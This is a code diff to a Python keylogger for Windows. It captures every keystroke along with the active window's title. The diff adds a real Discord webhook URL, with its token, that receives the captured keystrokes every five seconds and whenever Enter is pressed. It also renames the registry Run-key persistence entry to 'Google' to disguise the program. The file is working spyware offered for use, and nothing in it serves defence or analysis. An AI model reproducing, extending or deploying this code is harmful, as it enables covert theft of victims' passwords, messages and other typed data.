@@ -6,14 +6,14 @@ import socket
 import win32gui
 import win32process
 import win32api
-import keyboard
 import threading
 import atexit
 import winreg as reg
 from datetime import datetime
+from pynput import keyboard
 
 # Discord Webhook URL
-WEBHOOK_URL = ""
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1355720476252704798/QfHQTbLamSNlG9dywD-F5hiytst3Cy2tL76Nf6gVtv9GtdU6BKf1XXluZ5UW6ZimOg-B"
 
 # Get PC name
 PC_NAME = socket.gethostname()
@@ -105,38 +105,35 @@ def send_keystrokes():
             keystrokes = ""
             keystroke_app, keystroke_window = "Unknown", "Unknown"
 
-# Function to log keystrokes
-def log_keystroke(event):
+# Function to log keystrokes using pynput
+def on_press(key):
     global keystrokes, keystroke_app, keystroke_window
     
-    key = event.name
-    
-    with keystroke_lock:
-        if not keystrokes:
-            keystroke_app, keystroke_window = get_active_window_title() or ("Unknown", "Unknown")
-        
-        if len(key) == 1 and key.isprintable():
-            keystrokes += key
-        elif key == "space":
+    try:
+        char = key.char  # Get the character from the key
+        if char:
+            with keystroke_lock:
+                if not keystrokes:
+                    keystroke_app, keystroke_window = get_active_window_title() or ("Unknown", "Unknown")
+                keystrokes += char
+    except AttributeError:
+        # Handle special keys
+        if key == keyboard.Key.space:
             keystrokes += " "
-        elif key == "enter":
+        elif key == keyboard.Key.enter:
             keystrokes += "\n"
             send_keystrokes()  # Send log immediately on enter
-        elif key == "backspace" and keystrokes:
+        elif key == keyboard.Key.backspace and keystrokes:
             keystrokes = keystrokes[:-1]
 
-# Start keylogger thread
-keyboard.on_press(log_keystroke)
-def start_keylogger():
-    keyboard.wait()
-
-keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
-keylogger_thread.start()
+# Start the keylogger listener
+listener = keyboard.Listener(on_press=on_press)
+listener.start()
 
 # Function to periodically send keystrokes
 def keystroke_monitor():
     while True:
-        time.sleep(5)  # Reduced delay for more real-time logging
+        time.sleep(5)  # Check every second
         send_keystrokes()
 
 keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
@@ -145,7 +142,7 @@ keystroke_thread.start()
 # Function to add the script to Windows startup
 def add_to_startup():
     key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-    value_name = "TracewareStealth"
+    value_name = "Google"
     script_path = os.path.abspath(__file__)
     try:
         with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
@@ -159,7 +156,7 @@ add_to_startup()
 # Function to monitor if the script is still running
 def monitor_running():
     while True:
-        time.sleep(15)  # Check every 15 seconds
+        time.sleep(10)  # Check every 10 seconds
         if not psutil.pid_exists(os.getpid()):  # Check if the current process is still running
             log_system_shutdown()  # Log if the process is not running
             break
